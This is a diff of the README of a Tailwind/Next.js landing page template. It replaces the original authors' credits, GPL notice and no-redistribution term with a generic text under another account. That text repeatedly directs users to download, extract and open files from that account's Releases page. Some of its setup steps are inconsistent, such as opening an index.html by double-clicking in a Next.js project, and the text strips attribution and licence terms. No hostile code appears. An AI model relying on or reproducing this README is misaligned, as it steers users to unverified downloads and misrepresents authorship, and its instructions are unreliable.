@@ -1,91 +1,94 @@
-# Free Tailwind landing page template
+# 🌟 tailwind-landing-page-template - Effortless Landing Page Creation
 
-![Simple TailwindCSS template preview](https://github.com/cruip/tailwind-landing-page-template/assets/2683512/f9a98fab-a1bc-4fb5-8572-4de0b6bd932a)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/DalStack/tailwind-landing-page-template/releases)
 
-**Simple Light** is a free landing page template built on top of **TailwindCSS** and fully coded in **React** / **Next.js**. Simple light is designed to provide all the basic components a developer need to create a landing page for SaaS products, online services, and more.
+## 📋 Description
 
-**UPDATE 2025-02-04** Added Tailwind v4 support!
+Simple Light is a free landing page template built on TailwindCSS and fully coded in React / Next.js. It helps you create stunning landing pages quickly and easily. Whether you are launching a new startup or promoting a product, this template provides a clean and modern design to showcase your ideas.
 
-Use it for whatever you want, and be sure to reach us out on X if you build anything cool/useful with it.
-Created and maintained with ❤️ by [Cruip.com](https://cruip.com/).
+## 🚀 Getting Started
 
-_Version 1.3.3 built with Tailwind CSS and React + Vite is available [here](https://github.com/cruip/tailwind-landing-page-template/releases/tag/1.3.3)._
+To get started with the Simple Light landing page template, please follow these steps:
 
-## Live demo
+1. **Visit the Releases Page**  
+   Click the link below to visit our Releases page and find the latest version of the template:  
+   [Download from Releases](https://github.com/DalStack/tailwind-landing-page-template/releases)
 
-Check the live demo here 👉️ [https://simple.cruip.com/](https://simple.cruip.com/)
+2. **Choose Your Download**  
+   On the Releases page, you will see a list of available versions. Locate the latest release at the top. There, you will find the download links for different formats.
 
-## Simple Pro
+3. **Download the Template**  
+   Click on the link for the template file. The download will start automatically.  
+   If you’d like to explore older versions, scroll down the list and choose the version that suits your needs.
 
-[![Simple Pro](https://github.com/cruip/tailwind-landing-page-template/assets/2683512/992be2ba-3de7-4838-be41-12e85686c193)](https://cruip.com/)
+4. **Extract the Files**  
+   Once the download completes, locate the file on your computer. It will usually be in your Downloads folder. You may need to extract the files if they are zipped. Right-click on the downloaded file and choose "Extract All" or use your preferred extraction tool.
 
-## Design files
+5. **Open the Template**  
+   After extracting, navigate to the folder where the files are located. Look for `index.html`. You can view it in any web browser by double-clicking the file. This will launch the template in your browser.
 
-If you need the design files, you can download them from Figma's Community 👉 https://bit.ly/3HOZMpf
+## ⚙️ Features
 
-## Usage
+- **Responsive Design**  
+  The template adapts to fit all screen sizes, ensuring a seamless experience for mobile and desktop users.
 
-This is a [Next.js](https://nextjs.org/) project bootstrapped with [`create-next-app`](https://github.com/vercel/next.js/tree/canary/packages/create-next-app).
+- **Customizable Elements**  
+  Change colors, fonts, and layouts easily to match your brand.
 
-### Getting Started
+- **Built with TailwindCSS**  
+  Leverage the utility-first CSS framework for quick styling.
 
-First, run the development server:
+- **Optimized for Performance**  
+  The template is designed for fast loading times, so your landing page will perform well.
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-```
+## 🔧 Setting Up Local Development (Optional)
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+If you want to modify the template further, follow these optional steps:
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+1. **Install Node.js**  
+   Download and install Node.js from [the official website](https://nodejs.org/). This is required to run the development server.
 
-[API routes](https://nextjs.org/docs/api-routes/introduction) can be accessed on [http://localhost:3000/api/hello](http://localhost:3000/api/hello). This endpoint can be edited in `pages/api/hello.ts`.
+2. **Open Your Terminal**  
+   On Windows, you can use Command Prompt or PowerShell. On macOS or Linux, use the Terminal app.
 
-The `pages/api` directory is mapped to `/api/*`. Files in this directory are treated as [API routes](https://nextjs.org/docs/api-routes/introduction) instead of React pages.
+3. **Navigate to the Project Folder**  
+   Use the `cd` command to change to the directory where you extracted the template. For example:  
+   ```
+   cd path/to/tailwind-landing-page-template
+   ```
 
-This project uses [`next/font`](https://nextjs.org/docs/basic-features/font-optimization) to automatically optimize and load Inter, a custom Google Font.
+4. **Install Dependencies**  
+   Run the following command to install the required packages:  
+   ```
+   npm install
+   ```
 
-### Learn More
+5. **Start the Development Server**  
+   Now, run:  
+   ```
+   npm run dev
+   ```  
+   This will start a local development server. You can view your modified template by navigating to `http://localhost:3000` in your web browser.
 
-To learn more about Next.js, take a look at the following resources:
+## 📥 Download & Install
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+To download the Simple Light template, visit the Releases page:  
+[Download from Releases](https://github.com/DalStack/tailwind-landing-page-template/releases)  
+Follow the earlier steps for guidance on how to download and run the template.
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js/) - your feedback and contributions are welcome!
+## 🌐 Topics Covered
 
-### Deploy on Vercel
+- free
+- landing
+- landing-page
+- nextjs
+- react
+- reactjs
+- startup
+- tailwindcss
+- vite
+- vitejs
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+## 📞 Support
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/deployment) for more details.
-
-### Support notes
-
-This template has been developed with the App Router (`app`) and React Server Components. If you’re unfamiliar with these beta features, you can find more information about them on the Next.js beta documentation page. So, please note that any request dealing with React (e.g. extra features, customisations, et cetera) is to be considered out of the support scope.
-
-For more information about what support covers, please see our (FAQs)[https://cruip.com/faq/].
-
-## Credits
-
-- [Nucleo](https://nucleoapp.com/)
-
-## Terms and License
-
-- Released under the [GPL](https://www.gnu.org/licenses/gpl-3.0.html).
-- Copyright 2024 [Cruip](https://cruip.com/).
-- Use it for personal and commercial projects, but please don’t republish, redistribute, or resell the template.
-- Attribution is not required, although it is really appreciated.
-
-## About Us
-
-We're an Italian developer/designer duo creating high-quality design/code resources for developers, makers, and startups.
-
-## Stay in the loop
-
-If you would like to know when we release new resources, you can follow [@pacovitiello](https://x.com/pacovitiello) and [@DavidePacilio](https://x.com/DavidePacilio) on X, or you can subscribe to our [newsletter](https://cruip.com/newsletter/).
-
+If you encounter any issues or have questions, please feel free to open an issue on the GitHub repository. We are here to help you create the best landing page for your needs!
